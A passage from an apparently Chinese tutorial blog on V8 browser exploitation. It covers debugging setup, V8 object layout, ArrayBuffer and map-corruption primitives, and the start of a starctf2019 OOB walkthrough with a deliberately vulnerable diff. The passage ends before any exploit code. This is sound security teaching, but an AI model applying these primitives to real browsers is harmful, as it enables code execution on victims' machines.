IR<br>--print-bytecode #打印生成的bytecode<br>--shell #运行脚本后切入交互模式<br></code></pre></td></tr></table></figure><ul><li><code>--allow-natives-syntax</code>参数主要用于引入以下函数</li></ul><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">%<span class="hljs-title class_">DebugPrint</span>(obj) <span class="hljs-comment">//打印对象相关信息，debug版本输出更详细</span><br>%<span class="hljs-title class_">SystemBreak</span>() <span class="hljs-comment">//下断点，结合gdb等调试器使用</span><br></code></pre></td></tr></table></figure><ul><li><code>--trace-turbo</code>参数用于生成<code>turbo-*.json</code>格式的IR图数据文件，在<code>turbolizer</code>工具加载文件生成可视化IR图</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">npm install -g turbolizer  #安装turbolizer<br></code></pre></td></tr></table></figure><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/4.png" alt="4"></p><p>效果如下</p><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/5.png" alt="5"></p><p><strong>gdb调试技巧</strong></p><ul><li>结合<code>--allow-natives-syntax</code>参数调试js代码</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">~/Desktop/browser_v8/v8/out/x64.release$ gdb ./d8<br><span class="hljs-meta prompt_">pwndbg&gt; </span><span class="language-bash"><span class="hljs-built_in">set</span> args --allow-natives-syntax ./js_code/test.js</span><br></code></pre></td></tr></table></figure><ul><li>telescope查看指定地址的内存数据</li></ul><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">telescope</span> addr<span class="hljs-meta"> [length]</span><br></code></pre></td></tr></table></figure><ul><li>job</li></ul><p>查看JavaScript对象的内存结构</p><figure class="highlight cos"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs cos"><span class="hljs-keyword">job</span> 对象地址<br></code></pre></td></tr></table></figure><ul><li><code>v8/tools/gdbinit</code>中有更多命令的定义和注释</li></ul><p>tips：由于指针标记机制，gdb中查看对象时，job命令的参数为对象地址，其它命令(x、telescope等)的参数为对象地址-1</p><h2 id="v8基础"><a href="#v8基础" class="headerlink" title="v8基础"></a>v8基础</h2><h3 id="数据类型和对象"><a href="#数据类型和对象" class="headerlink" title="数据类型和对象"></a>数据类型和对象</h3><p>在 <code>js</code> 中，数据类型可以分为以下两类：</p><ul><li>基础数据类型：<code>undefined</code>，<code>null</code>，<code>Number</code>，<code>String</code>，<code>Boolean</code>，<code>Symbol</code>(ES6)，<code>BigInt</code>(ES10)</li><li>引用数据类型：<code>Object</code>，<code>Array</code>，<code>Function</code>，<code>Data</code>，<code>RegExp</code>，<code>ArrayBuffer</code>等</li></ul><p>基础数据类型创建后不可修改，对其进行赋值操作实际上是销毁再创建；引用数据类型可修改，赋值操作相当于改变原来的内存数据。</p><p>对象存储在堆(实际上是<code>anon</code>段,非<code>heap</code>系统堆)中，栈中保存对象的引用地址(指针)。</p><p> 除了Number中的Smis，v8中类型变量均以对象形式存储在堆上，栈上存放引用指针。</p><h3 id="指针标记"><a href="#指针标记" class="headerlink" title="指针标记"></a>指针标记</h3><p>v8中数据都以对象引用指针的形式表示，但如果最基本的小整数(Smis)都要作为对象存储，将会带来巨大的开支，比如：循环中递增索引时，每次都需要分配新的number对象。</p><p>为了解决这类问题，V8使用指针标记技术来区分小整数和指针，使得小整数(Smis)以立即数而非对象的形式与指针共同存储。</p><figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs vbnet"><span class="hljs-symbol">Smi:</span> Represented <span class="hljs-keyword">as</span> value &lt;&lt; <span class="hljs-number">32</span>, i.e <span class="hljs-number">0</span>xdeadbeef <span class="hljs-built_in">is</span> represented <span class="hljs-keyword">as</span> <span class="hljs-number">0</span>xdeadbeef00000000<br><span class="hljs-symbol">Pointers:</span> Represented <span class="hljs-keyword">as</span> addr &amp; <span class="hljs-number">1</span>. <span class="hljs-number">0</span>x2233ad9c2ed8 <span class="hljs-built_in">is</span> represented <span class="hljs-keyword">as</span> <span class="hljs-number">0</span>x2233ad9c2ed9<br></code></pre></td></tr></table></figure><p>因为v8分配的堆对象地址是字对齐的(4byte&#x2F;8byte)，所以指针最低2&#x2F;3位始终为0，可以用来存储其它信息：最后一位区分指针和Smi(1表示指针，0表示Smi)，倒数第二位区分强引用和弱引用。</p><p>在64位机器中，Smi的高32位表示数值，低32位始终为0，如下图</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">            |<span class="hljs-string">----- 32 bits -----</span>|<span class="hljs-string">----- 32 bits -----</span>|<br>Pointer:    |<span class="hljs-string">________________address______________w1</span>|<br>Smi:        |<span class="hljs-string">____int32_value____</span>|<span class="hljs-string">0000000000000000000</span>|<br></code></pre></td></tr></table></figure><h3 id="内存布局"><a href="#内存布局" class="headerlink" title="内存布局"></a>内存布局</h3><p>在gdb中使用vmmap查看内存布局，可以发现除了栈和系统堆heap，低地址内存中还有大片由v8通过mmap申请的<code>anon</code>区域，创建的对象都存储在该片区域。</p><p><img src="/2024/11/11/chrome-v8-pwn%E5%85%A5%E9%97%A8/6.png" alt="6"></p><p>接着我们观察v8堆中对象的布局，我们采用不同方式创建两个数组对象，观察它们对象结构和元素的存储地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>]<br><span class="hljs-keyword">var</span> b = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Array</span>(<span class="hljs-number">3</span>);<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">DebugPrint</span>(b);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>可以分析出由低地址向高地址拓展，布局如下：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs stylus">--------低地址--------<br> - elements: <span class="hljs-number">0</span>x0d2d08d8dd21 &lt;FixedArray<span class="hljs-selector-attr">[3]</span>&gt; <span class="hljs-selector-attr">[PACKED_SMI_ELEMENTS (COW)]</span>   <span class="hljs-comment">//a元素地址  </span><br>DebugPrint: <span class="hljs-number">0</span>xd2d08d8dd91: <span class="hljs-selector-attr">[JSArray]</span>          <span class="hljs-comment">//a对象地址</span><br>DebugPrint: <span class="hljs-number">0</span>xd2d08d8ddb1: <span class="hljs-selector-attr">[JSArray]</span>         <span class="hljs-comment">//b对象地址</span><br> - elements: <span class="hljs-number">0</span>x0d2d08d8dde1 &lt;FixedArray<span class="hljs-selector-attr">[3]</span>&gt; <span class="hljs-selector-attr">[HOLEY_SMI_ELEMENTS]</span>  <span class="hljs-comment">//b元素地址</span><br>--------高地址--------<br></code></pre></td></tr></table></figure><p>直接创建的Array，元素存储在低地址，对象存储在高地址；new创建的Array，元素存储在高地址，对象存储在低地址。</p><h3 id="对象的结构"><a href="#对象的结构" class="headerlink" title="对象的结构"></a>对象的结构</h3><p>在debug版本中调试分析，主要分析String、Array和ArrayBuffer的对象结构</p><h4 id="String"><a href="#String" class="headerlink" title="String"></a>String</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-string">&quot;AAAABBBBCCCC&quot;</span>;<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>%DebugPrint输出了变量所在的函数栈帧和map信息</p><figure class="highlight smali"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs smali"><span class="hljs-comment">#AAAABBBBCCCC</span><br>fp = 0x7fff2dcce0d0, sp = 0x7fff2dcce090, caller_sp = 0x7fff2dcce0e0: 0x10ea1d880461: [Map]<br> - type: ONE_BYTE_INTERNALIZED_STRING_TYPE<br> -<span class="hljs-built_in"> instance </span>size: variable<br> - elements kind: HOLEY_ELEMENTS<br> - unused property fields: 0<br> - enum length: invalid<br> - stable_map<br> - back pointer: 0x10ea1d8804d1 &lt;undefined&gt;<br> - prototype_validity cell: 0<br> -<span class="hljs-built_in"> instance </span>descriptors (own) <span class="hljs-comment">#0: 0x10ea1d880259 &lt;DescriptorArray[0]&gt;</span><br> - layout descriptor: (nil)<br> - prototype: 0x10ea1d8801d9 &lt;null&gt;<br> -<span class="hljs-keyword"> constructor</span>: 0x10ea1d8801d9 &lt;null&gt;<br> - dependent code: 0x10ea1d8802c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;<br> - construction counter: 0<br></code></pre></td></tr></table></figure><p>我们在栈帧中找到对象地址并查看，发现从低地址到高地址其结构如下</p><ul><li>字符串长度</li><li>字符串本体，使用0xdeadbeed填充至字对齐</li><li>map属性</li></ul><figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs x86asm">pwndbg&gt; job <span class="hljs-number">0x3b515481f211</span><br>#AAAABBBBCCCC<br>pwndbg&gt; x/20gx <span class="hljs-number">0x3b515481f210</span><br><span class="hljs-number">0x3b515481f210</span>:<span class="hljs-number">0x000010ea1d880461</span><span class="hljs-number">0x0000000c5e39f07e</span>  &lt;-----<br><span class="hljs-number">0x3b515481f220</span>:<span class="hljs-number">0x4242424241414141</span><span class="hljs-number">0xdeadbeed43434343</span>  &lt;-----<br><span class="hljs-number">0x3b515481f230</span>:<span class="hljs-number">0x000010ea1d880461</span><span class="hljs-number">0x0000000a4e921a1a</span><br><span class="hljs-number">0x3b515481f240</span>:<span class="hljs-number">0x6972506775626544</span><span class="hljs-number">0xdeadbeedbead746e</span><br><span class="hljs-number">0x3b515481f250</span>:<span class="hljs-number">0x000010ea1d880461</span><span class="hljs-number">0x0000000b98f2aa1e</span><br><span class="hljs-number">0x3b515481f260</span>:<span class="hljs-number">0x72426d6574737953</span><span class="hljs-number">0xdeadbeedbe6b6165</span><br><span class="hljs-number">0x3b515481f270</span>:<span class="hljs-number">0x000010ea1d880991</span><span class="hljs-number">0x0000000700000000</span><br><span class="hljs-number">0x3b515481f280</span>:<span class="hljs-number">0x00000c4300000000</span><span class="hljs-number">0x0000000000000000</span><br><span class="hljs-number">0x3b515481f290</span>:<span class="hljs-number">0x0000000000000000</span><span class="hljs-number">0x000010ea1d880751</span><br><span class="hljs-number">0x3b515481f2a0</span>:<span class="hljs-number">0xffffffff00000000</span><span class="hljs-number">0x0000000000000000</span><br>pwndbg&gt; job <span class="hljs-number">0xc5e39f07e</span><br><span class="hljs-symbol">Smi:</span> <span class="hljs-number">0xc</span> (<span class="hljs-number">12</span>)<br></code></pre></td></tr></table></figure><h4 id="Array"><a href="#Array" class="headerlink" title="Array"></a>Array</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = [<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>];<br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>其结构如下：</p><ul><li>map属性</li><li>prototype - 对象的原型</li><li>elements - 数组中元素的存储地址(对象结构体的低地址不远处)</li><li>length - 数组中的元素个数</li><li>properties - 对象的属性描述符</li></ul><p>也就是说，在内存申请上，v8先申请了一块内存存储元素内容，然后申请了一块内存存储对象结构</p><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">DebugPrint</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x29eb68f8dd71: [JSArray]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">map: 0x057f96042fc9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x1fc0fca11111 &lt;JSArray[0]&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements: 0x29eb68f8dda1 &lt;FixedArray[3]&gt; [HOLEY_ELEMENTS]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">length: 3</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">properties: 0x15b1b8dc0c71 &lt;FixedArray[0]&gt; &#123;</span><br>    <span class="hljs-comment">#length: 0x095c4f0001a9 &lt;AccessorInfo&gt; (const accessor descriptor)</span><br> <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute"> - elements</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x29eb68f8dda1 &lt;FixedArray[3]&gt; &#123;</span><br>           <span class="hljs-attribute">0</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x1fc0fca1f211 &lt;String[#4]: str1&gt;</span><br>           <span class="hljs-attribute">1</span><span class="hljs-punctuation">:</span> <span class="hljs-string">233</span><br>           <span class="hljs-attribute">2</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x1fc0fca1f361 &lt;HeapNumber 1.1&gt;</span><br> <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute">0x57f96042fc9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[Map]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">type: JS_ARRAY_TYPE</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">instance size: 32</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">inobject properties: 0</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements kind: HOLEY_ELEMENTS</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">unused property fields: 0</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">enum length: invalid</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">stable_map</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">back pointer: 0x057f96042f79 &lt;Map(PACKED_ELEMENTS)&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype_validity cell: 0x095c4f000609 &lt;Cell value= 1&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">instance descriptors (own) #1: 0x1fc0fca11f49 &lt;DescriptorArray[1]&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">layout descriptor: (nil)</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x1fc0fca11111 &lt;JSArray[0]&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">constructor: 0x1fc0fca10ec1 &lt;JSFunction Array (sfi = 0x95c4f00a9b9)&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">dependent code: 0x15b1b8dc02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">construction counter: 0</span><br></code></pre></td></tr></table></figure><h4 id="ArrayBuffer"><a href="#ArrayBuffer" class="headerlink" title="ArrayBuffer"></a>ArrayBuffer</h4><p><code>ArrayBuffer</code>表示一块定长的原始二进制数据缓冲区，不能直接操作，需要通过<code>TypeArray</code>(如Uint8Array、Int16Array、Float64Array等)将缓冲区与数据类型相关联，才能以特定的数据类型格式访问内存空间。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">var</span> a = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayBuffer</span>(<span class="hljs-number">20</span>);<br><span class="hljs-keyword">let</span> view = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Uint32Array</span>(a);<br>view[<span class="hljs-number">0</span>] = <span class="hljs-number">0x1234</span>;<br>view[<span class="hljs-number">1</span>] = <span class="hljs-number">0x5678</span>; <br>%<span class="hljs-title class_">DebugPrint</span>(a);<br>%<span class="hljs-title class_">SystemBreak</span>();<br></code></pre></td></tr></table></figure><p>结构如下，其中需要关注的是<code>backing_store</code>和<code>byte_length</code>。</p><p>backing_store指向ArrayBuffer开辟的内存空间，该内存位于<code>系统堆</code>上，我们可以使用<code>TypedArray</code>指定的类型读写该区域。</p><p>byte_length表示缓冲区的长度。</p><p>针对ArrayBuffer的常见利用：</p><ul><li>修改<code>byte_length</code>造成越界访问(oob)</li><li>修改<code>backing_store</code>指针实现任意地址读写</li><li>通过<code>backing_store</code>指针泄露堆地址</li></ul><figure class="highlight nestedtext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs nestedtext"><span class="hljs-attribute">DebugPrint</span><span class="hljs-punctuation">:</span> <span class="hljs-string">0x242a6484ddc9: [JSArrayBuffer]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">map: 0x06145b4021b9 &lt;Map(HOLEY_ELEMENTS)&gt; [FastProperties]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x20a6f9e0e981 &lt;Object map = 0x6145b402209&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements: 0x341e7d1c0c71 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">embedder fields: 2</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">backing_store: 0x55c0900ce200</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">byte_length: 20</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">detachable</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">properties: 0x341e7d1c0c71 &lt;FixedArray[0]&gt; &#123;&#125;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">embedder fields = &#123;</span><br>    <span class="hljs-attribute">0, aligned pointer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">(nil)</span><br>    <span class="hljs-attribute">0, aligned pointer</span><span class="hljs-punctuation">:</span> <span class="hljs-string">(nil)</span><br> <span class="hljs-attribute">&#125;</span><br><span class="hljs-attribute">0x6145b4021b9</span><span class="hljs-punctuation">:</span> <span class="hljs-string">[Map]</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">type: JS_ARRAY_BUFFER_TYPE</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">instance size: 64</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">inobject properties: 0</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">elements kind: HOLEY_ELEMENTS</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">unused property fields: 0</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">enum length: invalid</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">stable_map</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">back pointer: 0x341e7d1c04d1 &lt;undefined&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype_validity cell: 0x10af3bbc0609 &lt;Cell value= 1&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">instance descriptors (own) #0: 0x341e7d1c0259 &lt;DescriptorArray[0]&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">layout descriptor: (nil)</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">prototype: 0x20a6f9e0e981 &lt;Object map = 0x6145b402209&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">constructor: 0x20a6f9e0e7e9 &lt;JSFunction ArrayBuffer (sfi = 0x10af3bbd1221)&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">dependent code: 0x341e7d1c02c1 &lt;Other heap object (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br> <span class="hljs-bullet">-</span> <span class="hljs-string">construction counter: 0</span><br></code></pre></td></tr></table></figure><h4 id="map属性"><a href="#map属性" class="headerlink" title="map属性"></a>map属性</h4><p>不同类型数据的map属性结构相同。其中几个字段的含义如下：</p><ul><li>type:对象的动态类型，如String、Uint8Array、Array等</li><li>instance size:对象的大小(以字节为单位)</li><li>elements kind:元素类型，如浮点数、指针</li></ul><p>map属性定义了v8对js对象的解析方式(比如将对象作为什么类型访问)，通过修改对象的map为其它类型对象的map，我们能够实现类型混淆，继而实现地址泄露和内存读写。</p><p>这里我们暂时不需要更深入地了解每个字段的含义，因为是对整个map进行替换。</p><h2 id="例题分析"><a href="#例题分析" class="headerlink" title="例题分析"></a>例题分析</h2><p>一般浏览器的出题有两种，一种是diff修改v8引擎源代码，人为制造出一个漏洞，另一种是直接采用某个cve漏洞。一般在大型比赛中会直接采用第二种方式，更考验选手的实战能力。</p><p>同时，v8 pwn的目标是任意代码执行，而不是单纯的getshell，因此传统pwn中onegadget等手法不适用</p><h3 id="starctf2019-OOB"><a href="#starctf2019-OOB" class="headerlink" title="starctf2019 - OOB"></a>starctf2019 - OOB</h3><p>远程nc后给出commits哈希，附件里有diff文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell">the v8 commits is 6dc88c191f5ecc5389dc26efa3ca0907faef3598.<br></code></pre></td></tr></table></figure><h4 id="分析diff文件"><a href="#分析diff文件" class="headerlink" title="分析diff文件"></a>分析diff文件</h4><p>为Array对象注册oob函数，内部表示为kArrayOob</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs javascript">diff --git a/src/bootstrapper.<span class="hljs-property">cc</span> b/src/bootstrapper.<span class="hljs-property">cc</span><br>index b027d36..<span class="hljs-property">ef1002f</span> <span class="hljs-number">100644</span><br>--- a/src/bootstrapper.<span class="hljs-property">cc</span><br>+++ b/src/bootstrapper.<span class="hljs-property">cc</span><br>@@ -<span class="hljs-number">1668</span>,<span class="hljs-number">6</span> +<span class="hljs-number">1668</span>,<span class="hljs-number">8</span> @@ <span class="hljs-keyword">void</span> <span class="hljs-title class_">Genesis</span>::<span class="hljs-title class_">InitializeGlobal</span>(<span class="hljs-title class_">Handle</span>&lt;<span class="hljs-title class_">JSGlobalObject</span>&gt; global_object,<br>                           <span class="hljs-title class_">Builtins</span>::kArrayPrototypeCopyWithin, <span class="hljs-number">2</span>, <span class="hljs-literal">false</span>);<br>     <span class="hljs-title class_">SimpleInstallFunction</span>(isolate_, proto, <span class="hljs-string">&quot;fill&quot;</span>,<br>                           <span class="hljs-title class_">Builtins</span>::kArrayPrototypeFill, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>+    <span class="hljs-title class_">SimpleInstallFunction</span>(isolate_, proto, <span class="hljs-string">&quot;oob&quot;</span>,<br>+                          <span class="hljs-title class_">Builtins</span>::kArrayOob,<span class="hljs-number">2</span>,<span class="hljs-literal">false</span>);<br>     <span class="hljs-title class_">SimpleInstallFunction</span>(isolate_, proto, <span class="hljs-string">&quot;find&quot;</span>,<br>                           <span class="hljs-title class_">Builtins</span>::kArrayPrototypeFind, <span class="hljs-number">1</span>, <span class="hljs-literal">false</span>);<br>     <span class="hljs-title class_">SimpleInstallFunction</span>(isolate_, proto, <span class="hljs-string">&quot;findIndex&quot;</span>,<br></code></pre></td></tr></table></figure><p>ArrayOob函数的具体实现，漏洞出现在这里</p><p>C++中成员函数的第一个参数必定是this指针，因此oob函数无参数时len为1，函数返回Array[length]，存在一个元素的越界读；oob函数有一个参数时将该参数存入Array[length]并返回undefine，存在一个元素的越界写。</p><p>结合先前对内存布局的分析，对于非new创建的Array，这里越界读写的就是当前Array对象的map地址</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs javascript">diff --git a/src/builtins/builtins-array.<span class="hljs-property">cc</span> b/src/builtins/builtins-array.<span class="hljs-property">cc</span><br>index 8df340e..9b828ab <span class="hljs-number">100644</span><br>--- a/src/builtins/builtins-array.<span class="hljs-property">cc</span><br>+++ b/src/builtins/builtins-array.<span class="hljs-property">cc</span><br>@@ -<span class="hljs-number">361</span>,<span class="hljs-number">6</span> +<span class="hljs-number">361</span>,<span class="hljs-number">27</span> @@ <span class="hljs-variable constant_">V8_WARN_UNUSED_RESULT</span> <span class="hljs-title class_">Object</span> <span class="hljs-title class_">GenericArrayPush</span>(<span class="hljs-title class_">Isolate</span>* isolate,<br>   <span class="hljs-keyword">return</span> *final_length;<br> &#125;<br> &#125;  <span class="hljs-comment">// namespace</span><br>+<span class="hljs-title function_">BUILTIN</span>(<span class="hljs-params">ArrayOob</span>)&#123;<br>+    uint32_t len = args.<span class="hljs-title function_">length</span>();<br>+    <span class="hljs-keyword">if</span>(len &gt; <span class="hljs-number">2</span>) <span class="hljs-keyword">return</span> <span class="hljs-title class_">ReadOnlyRoots</span>(isolate).<span class="hljs-title function_">undefined_value</span>();<br>+    <span class="hljs-title class_">Handle</span>&lt;<span class="hljs-title class_">JSReceiver</span>&gt; receiver;<br>+    <span class="hljs-title function_">ASSIGN_RETURN_FAILURE_ON_EXCEPTION</span>(<br>+            isolate, receiver, <span class="hljs-title class_">Object</span>::<span class="hljs-title class_">ToObject</span>(isolate, args.<span class="hljs-title function_">receiver</span>()));<br>+    <span class="hljs-title class_">Handle</span>&lt;<span class="hljs-title class_">JSArray</span>&gt; array = <span class="hljs-title class_">Handle</span>&lt;<span class="hljs-title class_">JSArray</span>&gt;::<span class="hljs-title function_">cast</span>(receiver);<br>+    <span class="hljs-title class_">FixedDoubleArray</span> elements = <span class="hljs-title class_">FixedDoubleArray</span>::<span class="hljs-title function_">cast</span>(array-&gt;<span class="hljs-title function_">elements</span>());<br>+    uint32_t length = static_cast&lt;uint32_t&gt;(array-&gt;<span class="hljs-title function_">length</span>()-&gt;<span class="hljs-title class_">Number</span>());<br>+    <span class="hljs-keyword">if</span>(len == <span class="hljs-number">1</span>)&#123;<br>+        <span class="hljs-comment">//read</span><br>+        <span class="hljs-keyword">return</span> *(isolate-&gt;<span class="hljs-title function_">factory</span>()-&gt;<span class="hljs-title class_">NewNumber</span>(elements.<span class="hljs-title function_">get_scalar</span>(length)));<br>+    